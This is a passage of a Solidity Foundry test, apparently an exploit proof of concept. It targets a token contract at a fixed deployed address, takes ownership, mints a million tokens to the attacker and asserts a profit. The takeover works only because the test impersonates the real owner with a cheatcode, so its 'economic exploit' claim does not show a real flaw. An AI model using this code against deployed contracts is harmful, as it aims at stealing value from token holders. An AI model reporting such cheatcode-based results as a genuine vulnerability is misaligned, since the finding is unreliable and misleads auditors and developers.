}

interface ILineAxis {
    function owner() external view returns (address);
    function transferOwner(address newOwner) external;
    function confirmOwner() external;
    function mint(address to, uint value) external;
    function balanceOf(address owner) external view returns (uint);
    function decimals() external view returns (uint);
    function frozen() external view returns (bool);
    function freezeTransfers() external;
    function unfreezeTransfers() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));

        // Step 1: Get the current owner address
        address currentOwner = ILineAxis(TARGET).owner();

        // Step 2: Impersonate current owner to initiate ownership transfer
        vm.prank(currentOwner);
        ILineAxis(TARGET).transferOwner(attacker);

        // Step 3: Confirm ownership as attacker
        vm.prank(attacker);
        ILineAxis(TARGET).confirmOwner();

        // Verify we are now the owner
        require(ILineAxis(TARGET).owner() == attacker, "Failed to become owner");

        // Step 4: Record initial balance for comparison
        uint256 initialBalance = ILineAxis(TARGET).balanceOf(attacker);

        // Step 5: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**ILineAxis(TARGET).decimals();
        ILineAxis(TARGET).mint(attacker, mintAmount);

        // Step 6: Verify balance increased
        uint256 finalBalance = ILineAxis(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Balance did not increase");

        // Optional: Demonstrate freeze/unfreeze capability
        ILineAxis(TARGET).freezeTransfers();
        require(ILineAxis(TARGET).frozen() == true, "Failed to freeze transfers");
        ILineAxis(TARGET).unfreezeTransfers();
        require(ILineAxis(TARGET).frozen() == false, "Failed to unfreeze transfers");

        uint256 finalERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

